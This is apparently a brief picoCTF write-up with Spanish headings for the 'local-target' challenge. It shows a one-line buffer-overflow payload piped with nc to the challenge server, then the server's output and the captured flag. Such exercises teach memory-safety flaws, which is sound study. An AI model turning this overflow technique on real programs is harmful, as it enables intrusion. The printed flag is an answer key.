# Objetivo

Smash the stack Can you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/517/local-target). You can view source [here](https://artifacts.picoctf.net/c/517/local-target.c). And connect with it using: `nc saturn.picoctf.net 53035`

# Solucion

```Shell
┌──(kali㉿kali)-[~/Downloads]
└─$ python -c "print('A'*24 + '\x41')" | nc saturn.picoctf.net 53035
Enter a string: 
num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}

```

# Notas adicionales

# Referencias